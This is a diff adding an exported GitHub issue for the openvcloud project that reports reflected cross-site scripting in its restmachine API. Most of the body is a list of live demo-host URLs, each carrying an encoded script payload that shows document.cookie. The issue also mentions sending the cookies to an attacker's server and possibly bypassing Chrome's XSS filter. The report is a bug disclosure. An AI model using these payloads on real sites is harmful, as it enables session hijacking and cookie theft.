@@ -1,0 +1,32 @@
+assignee: ''
+body: "Attacker can steal the cookies by execute a malicious code in these links.\
+  \ I inject a code which show the cookies value for the user but the real Attacker\
+  \ will send it directly to his server.\r\n\r\n**Infected links:-** \r\n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/system/oauth'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/system/oauth/getOauthLogoutURl'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/system/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudbroker/user/create'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudbroker/user/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudbroker/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudbroker/iaas/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/accounts/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/cloudspaces/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/disks/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/images/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/locations/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/machines/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/portforwarding/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/sizes/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nhttps://du-conv-2.demo.greenitglobe.com/restmachine/cloudapi/users/'%3CScRiPt%20%3Ealert%28%22Here%20is%20your%20COOKIE%20%22+document.cookie+%22%20HACKED!%22%29%3C/ScRiPt%3E\r\
+  \n\r\nHint: This is working in firefox but chrom has its XSS protection, may be\
+  \ their is an way to bypass it. "
+comments: []
+id: 154462974
+labels: [priority_critical, type_bug]
+milestone: ''
+number: 139
+open: true
+state: open
+time: 2016/05/12 11:47:23
+title: securyt# XSS and steal the Cookies
+url: https://github.com/0-complexity/openvcloud/issues/139
